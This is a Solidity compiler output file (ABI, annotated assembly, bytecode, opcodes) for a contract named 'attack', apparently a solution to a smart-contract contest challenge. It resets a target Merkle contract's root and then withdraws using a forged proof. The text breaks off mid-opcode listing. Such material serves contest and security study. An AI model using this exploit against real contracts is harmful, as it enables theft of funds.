{
	"赛题-预赛/第三题/attack.sol": {
		"attack": {
			"abi": [
				{
					"inputs": [],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"stateMutability": "payable",
					"type": "fallback"
				},
				{
					"inputs": [
						{
							"internalType": "bytes32",
							"name": "root",
							"type": "bytes32"
						}
					],
					"name": "att",
					"outputs": [],
					"stateMutability": "payable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "att2",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "figure",
					"outputs": [
						{
							"internalType": "bytes32",
							"name": "",
							"type": "bytes32"
						}
					],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address",
							"name": "_addr",
							"type": "address"
						}
					],
					"name": "init",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"赛题-预赛/第三题/attack.sol\":88:2320  contract attack{\r... */\n  mstore(0x40, 0x80)\n    /* \"赛题-预赛/第三题/attack.sol\":128:159  constructor(){\r... */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n    /* \"赛题-预赛/第三题/attack.sol\":88:2320  contract attack{\r... */\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"赛题-预赛/第三题/attack.sol\":88:2320  contract attack{\r... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x12c973c1\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x13b6ae4c\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x19ab453c\n      eq\n      tag_5\n      jumpi\n      dup1\n      0x38a39681\n      eq\n      tag_6\n      jumpi\n      jump(tag_2)\n    tag_1:\n    tag_2:\n      stop\n        /* \"赛题-预赛/第三题/attack.sol\":244:700  function att(bytes32 root)public payable{\r... */\n    tag_3:\n      tag_9\n      0x04\n      dup1\n      calldatasize\n      sub\n      0x20\n      dup2\n      lt\n      iszero\n      tag_10\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_10:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_11\n      jump\t// in\n    tag_9:\n      stop\n        /* \"赛题-预赛/第三题/attack.sol\":1160:2267  function figure()public returns(bytes32){\r... */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_12\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_12:\n      pop\n      tag_13\n      tag_14\n      jump\t// in\n    tag_13:\n      mload(0x40)\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"赛题-预赛/第三题/attack.sol\":165:238  function init(address _addr)public{\r... */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_15\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_15:\n      pop\n      tag_16\n      0x04\n      dup1\n      calldatasize\n      sub\n      0x20\n      dup2\n      lt\n      iszero\n      tag_17\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_17:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      calldataload\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      tag_18\n      jump\t// in\n    tag_16:\n      stop\n        /* \"赛题-预赛/第三题/attack.sol\":706:1154  function att2()public {\r... */\n    tag_6:\n      callvalue\n      dup1\n      iszero\n      tag_19\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_19:\n      pop\n      tag_20\n      tag_21\n      jump\t// in\n    tag_20:\n      stop\n        /* \"赛题-预赛/第三题/attack.sol\":244:700  function att(bytes32 root)public payable{\r... */\n    tag_11:\n        /* \"赛题-预赛/第三题/attack.sol\":295:317  bytes32[] memory proof */\n      0x00\n        /* \"赛题-预赛/第三题/attack.sol\":334:335  2 */\n      0x02\n        /* \"赛题-预赛/第三题/attack.sol\":320:336  new bytes32[](2) */\n      0xffffffffffffffff\n      dup2\n      gt\n      dup1\n      iszero\n      tag_23\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_23:\n      pop\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x20\n      mul\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_24\n      jumpi\n      dup2\n      0x20\n      add\n      0x20\n      dup3\n      mul\n      dup1\n      calldatasize\n      dup4\n      calldatacopy\n      dup1\n      dup3\n      add\n      swap2\n      pop\n      pop\n      swap1\n      pop\n    tag_24:\n      pop\n        /* \"赛题-预赛/第三题/attack.sol\":295:336  bytes32[] memory proof = new bytes32[](2) */\n      swap1\n      pop\n        /* \"赛题-预赛/第三题/attack.sol\":505:571  0x0011223344556677889900112233445566778899001122334455667788990011 */\n      0x11223344556677889900112233445566778899001122334455667788990011\n        /* \"赛题-预赛/第三题/attack.sol\":496:571  proof[0]=0x0011223344556677889900112233445566778899001122334455667788990011 */\n      0x00\n      shl\n        /* \"赛题-预赛/第三题/attack.sol\":496:501  proof */\n      dup2\n        /* \"赛题-预赛/第三题/attack.sol\":502:503  0 */\n      0x00\n        /* \"赛题-预赛/第三题/attack.sol\":496:504  proof[0] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_25\n      jumpi\n      invalid\n    tag_25:\n      0x20\n      mul\n      0x20\n      add\n      add\n        /* \"赛题-预赛/第三题/attack.sol\":496:571  proof[0]=0x0011223344556677889900112233445566778899001122334455667788990011 */\n      dup2\n      dup2\n      mstore\n      pop\n      pop\n        /* \"赛题-预赛/第三题/attack.sol\":591:657  0x0011223344556677889900112233445566778899001122334455667788990022 */\n      0x11223344556677889900112233445566778899001122334455667788990022\n        /* \"赛题-预赛/第三题/attack.sol\":582:657  proof[1]=0x0011223344556677889900112233445566778899001122334455667788990022 */\n      0x00\n      shl\n        /* \"赛题-预赛/第三题/attack.sol\":582:587  proof */\n      dup2\n        /* \"赛题-预赛/第三题/attack.sol\":588:589  1 */\n      0x01\n        /* \"赛题-预赛/第三题/attack.sol\":582:590  proof[1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_26\n      jumpi\n      invalid\n    tag_26:\n      0x20\n      mul\n      0x20\n      add\n      add\n        /* \"赛题-预赛/第三题/attack.sol\":582:657  proof[1]=0x0011223344556677889900112233445566778899001122334455667788990022 */\n      dup2\n      dup2\n      mstore\n      pop\n      pop\n        /* \"赛题-预赛/第三题/attack.sol\":668:672  merk */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第三题/attack.sol\":668:686  merk.setMerkleroot */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x92f6c439\n        /* \"赛题-预赛/第三题/attack.sol\":687:691  root */\n      dup4\n        /* \"赛题-预赛/第三题/attack.sol\":668:692  merk.setMerkleroot(root) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_27\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_27:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_29\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_29:\n      pop\n      pop\n      pop\n      pop\n        /* \"赛题-预赛/第三题/attack.sol\":244:700  function att(bytes32 root)public payable{\r... */\n      pop\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第三题/attack.sol\":1160:2267  function figure()public returns(bytes32){\r... */\n    tag_14:\n        /* \"赛题-预赛/第三题/attack.sol\":1192:1199  bytes32 */\n      0x00\n        /* \"赛题-预赛/第三题/attack.sol\":1211:1233  bytes32[] memory proof */\n      dup1\n        /* \"赛题-预赛/第三题/attack.sol\":1250:1251  2 */\n      0x02\n        /* \"赛题-预赛/第三题/attack.sol\":1236:1252  new bytes32[](2) */\n      0xffffffffffffffff\n      dup2\n      gt\n      dup1\n      iszero\n      tag_31\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_31:\n      pop\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x20\n      mul\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_32\n      jumpi\n      dup2\n      0x20\n      add\n      0x20\n      dup3\n      mul\n      dup1\n      calldatasize\n      dup4\n      calldatacopy\n      dup1\n      dup3\n      add\n      swap2\n      pop\n      pop\n      swap1\n      pop\n    tag_32:\n      pop\n        /* \"赛题-预赛/第三题/attack.sol\":1211:1252  bytes32[] memory proof = new bytes32[](2) */\n      swap1\n      pop\n        /* \"赛题-预赛/第三题/attack.sol\":1421:1487  0x0011223344556677889900112233445566778899001122334455667788990011 */\n      0x11223344556677889900112233445566778899001122334455667788990011\n        /* \"赛题-预赛/第三题/attack.sol\":1412:1487  proof[0]=0x0011223344556677889900112233445566778899001122334455667788990011 */\n      0x00\n      shl\n        /* \"赛题-预赛/第三题/attack.sol\":1412:1417  proof */\n      dup2\n        /* \"赛题-预赛/第三题/attack.sol\":1418:1419  0 */\n      0x00\n        /* \"赛题-预赛/第三题/attack.sol\":1412:1420  proof[0] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_33\n      jumpi\n      invalid\n    tag_33:\n      0x20\n      mul\n      0x20\n      add\n      add\n        /* \"赛题-预赛/第三题/attack.sol\":1412:1487  proof[0]=0x0011223344556677889900112233445566778899001122334455667788990011 */\n      dup2\n      dup2\n      mstore\n      pop\n      pop\n        /* \"赛题-预赛/第三题/attack.sol\":1507:1573  0x0011223344556677889900112233445566778899001122334455667788990022 */\n      0x11223344556677889900112233445566778899001122334455667788990022\n        /* \"赛题-预赛/第三题/attack.sol\":1498:1573  proof[1]=0x0011223344556677889900112233445566778899001122334455667788990022 */\n      0x00\n      shl\n        /* \"赛题-预赛/第三题/attack.sol\":1498:1503  proof */\n      dup2\n        /* \"赛题-预赛/第三题/attack.sol\":1504:1505  1 */\n      0x01\n        /* \"赛题-预赛/第三题/attack.sol\":1498:1506  proof[1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_34\n      jumpi\n      invalid\n    tag_34:\n      0x20\n      mul\n      0x20\n      add\n      add\n        /* \"赛题-预赛/第三题/attack.sol\":1498:1573  proof[1]=0x0011223344556677889900112233445566778899001122334455667788990022 */\n      dup2\n      dup2\n      mstore\n      pop\n      pop\n        /* \"赛题-预赛/第三题/attack.sol\":1584:1604  bytes32 computedHash */\n      0x00\n        /* \"赛题-预赛/第三题/attack.sol\":1642:1646  this */\n      address\n        /* \"赛题-预赛/第三题/attack.sol\":1617:1648  abi.encodePacked(address(this)) */\n      add(0x20, mload(0x40))\n      dup1\n      dup3\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x60\n      shl\n      dup2\n      mstore\n      0x14\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n        /* \"赛题-预赛/第三题/attack.sol\":1607:1649  keccak256(abi.encodePacked(address(this))) */\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      keccak256\n        /* \"赛题-预赛/第三题/attack.sol\":1584:1649  bytes32 computedHash = keccak256(abi.encodePacked(address(this))) */\n      swap1\n      pop\n        /* \"赛题-预赛/第三题/attack.sol\":1712:1721  uint256 i */\n      0x00\n        /* \"赛题-预赛/第三题/attack.sol\":1707:2230  for (uint256 i = 0; i < proof.length; i++) {\r... */\n    tag_35:\n        /* \"赛题-预赛/第三题/attack.sol\":1731:1736  proof */\n      dup3\n        /* \"赛题-预赛/第三题/attack.sol\":1731:1743  proof.length */\n      mload\n        /* \"赛题-预赛/第三题/attack.sol\":1727:1728  i */\n      dup2\n        /* \"赛题-预赛/第三题/attack.sol\":1727:1743  i < proof.length */\n      lt\n        /* \"赛题-预赛/第三题/attack.sol\":1707:2230  for (uint256 i = 0; i < proof.length; i++) {\r... */\n      iszero\n      tag_36\n      jumpi\n        /* \"赛题-预赛/第三题/attack.sol\":1765:1785  bytes32 proofElement */\n      0x00\n        /* \"赛题-预赛/第三题/attack.sol\":1788:1793  proof */\n      dup4\n        /* \"赛题-预赛/第三题/attack.sol\":1794:1795  i */\n      dup3\n        /* \"赛题-预赛/第三题/attack.sol\":1788:1796  proof[i] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_38\n      jumpi\n      invalid\n    tag_38:\n      0x20\n      mul\n      0x20\n      add\n      add\n      mload\n        /* \"赛题-预赛/第三题/attack.sol\":1765:1796  bytes32 proofElement = proof[i] */\n      swap1\n      pop\n        /* \"赛题-预赛/第三题/attack.sol\":1831:1843  proofElement */\n      dup1\n        /* \"赛题-预赛/第三题/attack.sol\":1815:1827  computedHash */\n      dup4\n        /* \"赛题-预赛/第三题/attack.sol\":1815:1843  computedHash <= proofElement */\n      gt\n        /* \"赛题-预赛/第三题/attack.sol\":1811:2219  if (computedHash <= proofElement) {\r... */\n      tag_39\n      jumpi\n        /* \"赛题-预赛/第三题/attack.sol\":1985:1997  computedHash */\n      dup3\n        /* \"赛题-预赛/第三题/attack.sol\":1999:2011  proofElement */\n      dup2\n        /* \"赛题-预赛/第三题/attack.sol\":1968:2012  abi.encodePacked(computedHash, proofElement) */\n      add(0x20, mload(0x40))\n      dup1\n      dup4\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n        /* \"赛题-预赛/第三题/attack.sol\":1958:2013  keccak256(abi.encodePacked(computedHash, proofElement)) */\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      keccak256\n        /* \"赛题-预赛/第三题/attack.sol\":1943:2013  computedHash = keccak256(abi.encodePacked(computedHash, proofElement)) */\n      swap3\n      pop\n        /* \"赛题-预赛/第三题/attack.sol\":1811:2219  if (computedHash <= proofElement) {\r... */\n      jump(tag_40)\n    tag_39:\n        /* \"赛题-预赛/第三题/attack.sol\":2175:2187  proofElement */\n      dup1\n        /* \"赛题-预赛/第三题/attack.sol\":2189:2201  computedHash */\n      dup4\n        /* \"赛题-预赛/第三题/attack.sol\":2158:2202  abi.encodePacked(proofElement, computedHash) */\n      add(0x20, mload(0x40))\n      dup1\n      dup4\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup2\n      mstore\n      0x20\n      add\n      swap3\n      pop\n      pop\n      pop\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n        /* \"赛题-预赛/第三题/attack.sol\":2148:2203  keccak256(abi.encodePacked(proofElement, computedHash)) */\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      keccak256\n        /* \"赛题-预赛/第三题/attack.sol\":2133:2203  computedHash = keccak256(abi.encodePacked(proofElement, computedHash)) */\n      swap3\n      pop\n        /* \"赛题-预赛/第三题/attack.sol\":1811:2219  if (computedHash <= proofElement) {\r... */\n    tag_40:\n        /* \"赛题-预赛/第三题/attack.sol\":1707:2230  for (uint256 i = 0; i < proof.length; i++) {\r... */\n      pop\n        /* \"赛题-预赛/第三题/attack.sol\":1745:1748  i++ */\n      dup1\n      dup1\n      0x01\n      add\n      swap2\n      pop\n      pop\n        /* \"赛题-预赛/第三题/attack.sol\":1707:2230  for (uint256 i = 0; i < proof.length; i++) {\r... */\n      jump(tag_35)\n    tag_36:\n      pop\n        /* \"赛题-预赛/第三题/attack.sol\":2247:2259  computedHash */\n      dup1\n        /* \"赛题-预赛/第三题/attack.sol\":2240:2259  return computedHash */\n      swap3\n      pop\n      pop\n      pop\n        /* \"赛题-预赛/第三题/attack.sol\":1160:2267  function figure()public returns(bytes32){\r... */\n      swap1\n      jump\t// out\n        /* \"赛题-预赛/第三题/attack.sol\":165:238  function init(address _addr)public{\r... */\n    tag_18:\n        /* \"赛题-预赛/第三题/attack.sol\":224:229  _addr */\n      dup1\n        /* \"赛题-预赛/第三题/attack.sol\":210:214  merk */\n      0x00\n      dup1\n        /* \"赛题-预赛/第三题/attack.sol\":210:230  merk = Merkle(_addr) */\n      0x0100\n      exp\n      dup2\n      sload\n      dup2\n      0xffffffffffffffffffffffffffffffffffffffff\n      mul\n      not\n      and\n      swap1\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      mul\n      or\n      swap1\n      sstore\n      pop\n        /* \"赛题-预赛/第三题/attack.sol\":165:238  function init(address _addr)public{\r... */\n      pop\n      jump\t// out\n        /* \"赛题-预赛/第三题/attack.sol\":706:1154  function att2()public {\r... */\n    tag_21:\n        /* \"赛题-预赛/第三题/attack.sol\":739:761  bytes32[] memory proof */\n      0x00\n        /* \"赛题-预赛/第三题/attack.sol\":778:779  2 */\n      0x02\n        /* \"赛题-预赛/第三题/attack.sol\":764:780  new bytes32[](2) */\n      0xffffffffffffffff\n      dup2\n      gt\n      dup1\n      iszero\n      tag_43\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_43:\n      pop\n      mload(0x40)\n      swap1\n      dup1\n      dup3\n      mstore\n      dup1\n      0x20\n      mul\n      0x20\n      add\n      dup3\n      add\n      0x40\n      mstore\n      dup1\n      iszero\n      tag_44\n      jumpi\n      dup2\n      0x20\n      add\n      0x20\n      dup3\n      mul\n      dup1\n      calldatasize\n      dup4\n      calldatacopy\n      dup1\n      dup3\n      add\n      swap2\n      pop\n      pop\n      swap1\n      pop\n    tag_44:\n      pop\n        /* \"赛题-预赛/第三题/attack.sol\":739:780  bytes32[] memory proof = new bytes32[](2) */\n      swap1\n      pop\n        /* \"赛题-预赛/第三题/attack.sol\":949:1015  0x0011223344556677889900112233445566778899001122334455667788990011 */\n      0x11223344556677889900112233445566778899001122334455667788990011\n        /* \"赛题-预赛/第三题/attack.sol\":940:1015  proof[0]=0x0011223344556677889900112233445566778899001122334455667788990011 */\n      0x00\n      shl\n        /* \"赛题-预赛/第三题/attack.sol\":940:945  proof */\n      dup2\n        /* \"赛题-预赛/第三题/attack.sol\":946:947  0 */\n      0x00\n        /* \"赛题-预赛/第三题/attack.sol\":940:948  proof[0] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_45\n      jumpi\n      invalid\n    tag_45:\n      0x20\n      mul\n      0x20\n      add\n      add\n        /* \"赛题-预赛/第三题/attack.sol\":940:1015  proof[0]=0x0011223344556677889900112233445566778899001122334455667788990011 */\n      dup2\n      dup2\n      mstore\n      pop\n      pop\n        /* \"赛题-预赛/第三题/attack.sol\":1035:1101  0x0011223344556677889900112233445566778899001122334455667788990022 */\n      0x11223344556677889900112233445566778899001122334455667788990022\n        /* \"赛题-预赛/第三题/attack.sol\":1026:1101  proof[1]=0x0011223344556677889900112233445566778899001122334455667788990022 */\n      0x00\n      shl\n        /* \"赛题-预赛/第三题/attack.sol\":1026:1031  proof */\n      dup2\n        /* \"赛题-预赛/第三题/attack.sol\":1032:1033  1 */\n      0x01\n        /* \"赛题-预赛/第三题/attack.sol\":1026:1034  proof[1] */\n      dup2\n      mload\n      dup2\n      lt\n      tag_46\n      jumpi\n      invalid\n    tag_46:\n      0x20\n      mul\n      0x20\n      add\n      add\n        /* \"赛题-预赛/第三题/attack.sol\":1026:1101  proof[1]=0x0011223344556677889900112233445566778899001122334455667788990022 */\n      dup2\n      dup2\n      mstore\n      pop\n      pop\n        /* \"赛题-预赛/第三题/attack.sol\":1112:1116  merk */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"赛题-预赛/第三题/attack.sol\":1112:1125  merk.withdraw */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x38be5592\n        /* \"赛题-预赛/第三题/attack.sol\":1126:1131  proof */\n      dup3\n        /* \"赛题-预赛/第三题/attack.sol\":1140:1144  this */\n      address\n        /* \"赛题-预赛/第三题/attack.sol\":1112:1146  merk.withdraw(proof,address(this)) */\n      mload(0x40)\n      dup4\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup4\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      mstore\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup5\n      dup2\n      dup2\n      mload\n      dup2\n      mstore\n      0x20\n      add\n      swap2\n      pop\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      0x20\n      mul\n      dup1\n      dup4\n      dup4\n      0x00\n    tag_47:\n      dup4\n      dup2\n      lt\n      iszero\n      tag_49\n      jumpi\n      dup1\n      dup3\n      add\n      mload\n      dup2\n      dup5\n      add\n      mstore\n      0x20\n      dup2\n      add\n      swap1\n      pop\n      jump(tag_47)\n    tag_49:\n      pop\n      pop\n      pop\n      pop\n      swap1\n      pop\n      add\n      swap4\n      pop\n      pop\n      pop\n      pop\n      0x20\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_50\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_50:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_52\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_52:\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n      0x20\n      dup2\n      lt\n      iszero\n      tag_53\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_53:\n      dup2\n      add\n      swap1\n      dup1\n      dup1\n      mload\n      swap1\n      0x20\n      add\n      swap1\n      swap3\n      swap2\n      swap1\n      pop\n      pop\n      pop\n      pop\n        /* \"赛题-预赛/第三题/attack.sol\":706:1154  function att2()public {\r... */\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122002fd6a8fd6613da6642b600d75676d4089c5f4dbb48cca74e9ae0bd70b70f1d164736f6c63430007060033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b5061065b806100206000396000f3fe6080604052600436106100435760003560e01c806312c973c11461004657806313b6ae4c1461007457806319ab453c1461009f57806338a39681146100f057610044565b5b005b6100726004803603602081101561005c57600080fd5b8101908080359060200190929190505050610107565b005b34801561008057600080fd5b5061008961025a565b6040518082815260200191505060405180910390f35b3480156100ab57600080fd5b506100ee600480360360208110156100c257600080fd5b81019080803573ffffffffffffffffffffffffffffffffffffffff16906020019092919050505061040d565b005b3480156100fc57600080fd5b50610105610450565b005b6000600267ffffffffffffffff8111801561012157600080fd5b506040519080825280602002602001820160405280156101505781602001602082028036833780820191505090505b5090507e1122334455667788990011223344556677889900112233445566778899001160001b8160008151811061018357fe5b6020026020010181815250507e1122334455667788990011223344556677889900112233445566778899002260001b816001815181106101bf57fe5b60200260200101818152505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166392f6c439836040518263ffffffff1660e01b815260040180828152602001915050600060405180830381600087803b15801561023e57600080fd5b505af1158015610252573d6000803e3d6000fd5b505050505050565b600080600267ffffffffffffffff8111801561027557600080fd5b506040519080825280602002602001820160405280156102a45781602001602082028036833780820191505090505b5090507e1122334455667788990011223344556677889900112233445566778899001160001b816000815181106102d757fe5b6020026020010181815250507e1122334455667788990011223344556677889900112233445566778899002260001b8160018151811061031357fe5b602002602001018181525050600030604051602001808273ffffffffffffffffffffffffffffffffffffffff1660601b815260140191505060405160208183030381529060405280519060200120905060005b825181101561040457600083828151811061037d57fe5b602002602001015190508083116103c457828160405160200180838152602001828152602001925050506040516020818303038152906040528051906020012092506103f6565b808360405160200180838152602001828152602001925050506040516020818303038152906040528051906020012092505b508080600101915050610366565b50809250505090565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050565b6000600267ffffffffffffffff8111801561046a57600080fd5b506040519080825280602002602001820160405280156104995781602001602082028036833780820191505090505b5090507e1122334455667788990011223344556677889900112233445566778899001160001b816000815181106104cc57fe5b6020026020010181815250507e1122334455667788990011223344556677889900112233445566778899002260001b8160018151811061050857fe5b60200260200101818152505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166338be559282306040518363ffffffff1660e01b815260040180806020018373ffffffffffffffffffffffffffffffffffffffff168152602001828103825284818151815260200191508051906020019060200280838360005b838110156105c05780820151818401526020810190506105a5565b505050509050019350505050602060405180830381600087803b1580156105e657600080fd5b505af11580156105fa573d6000803e3d6000fd5b505050506040513d602081101561061057600080fd5b8101908080519060200190929190505050505056fea264697066735822122002fd6a8fd6613da6642b600d75676d4089c5f4dbb48cca74e9ae0bd70b70f1d164736f6c63430007060033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x65B DUP1 PUSH2 0x20 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x43 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x12C973C1 EQ PUSH2 0x46 JUMPI DUP1 PUSH4 0x13B6AE4C EQ PUSH2 0x74 JUMPI DUP1 PUSH4 0x19AB453C EQ PUSH2 0x9F JUMPI DUP1 PUSH4 0x38A39681 EQ PUSH2 0xF0 JUMPI PUSH2 0x44 JUMP JUMPDEST JUMPDEST STOP JUMPDEST PUSH2 0x72 PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0x5C JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x107 JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x80 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x89 PUSH2 0x25A JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 DUP3 DUP2 MSTORE PUSH1 0x20 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xAB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0xEE PUSH1 0x4 DUP1 CALLDATASIZE SUB PUSH1 0x20 DUP2 LT ISZERO PUSH2 0xC2 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST DUP2 ADD SWAP1 DUP1 DUP1 CALLDATALOAD PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND SWAP1 PUSH1 0x20 ADD SWAP1 SWAP3 SWAP2 SWAP1 POP POP POP PUSH2 0x40D JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0xFC JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x105 PUSH2 0x450 JUMP JUMPDEST STOP JUMPDEST PUSH1 0x0 PUSH1 0x2 PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT DUP1 ISZERO PUSH2 0x121 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD SWAP1 DUP1 DUP3 MSTORE DUP1 PUSH1 0x20 MUL PUSH1 0x20 ADD DUP3 ADD PUSH1 0x40 MSTORE DUP1 ISZERO PUSH2 0x150 JUMPI DUP2 PUSH1 0x20 ADD PUSH1 0x20 DUP3 MUL DUP1 CALLDATASIZE DUP4 CALLDATACOPY DUP1 DUP3 ADD SWAP2 POP POP SWAP1 POP JUMPDEST POP SWAP1 POP PUSH31 0x11223344556677889900112233445566778899001122334455667788990011 PUSH1 0x0 SHL DUP2 PUSH1 0x0 DUP2 MLOAD DUP2 LT PUSH2 0x183 JUMPI INVALID JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD DUP2 DUP2 MSTORE POP POP PUSH31 0x11223344556677889900112233445566778899001122334455667788990022 PUSH1 0x0 SHL DUP2 PUSH1 0x1 DUP2 MLOAD DUP2 LT PUSH2 0x1BF JUMPI INVALID JUMPDEST PUSH1 0x20 MUL PUSH1 0x20 ADD ADD DUP2 DUP2 MSTORE POP POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 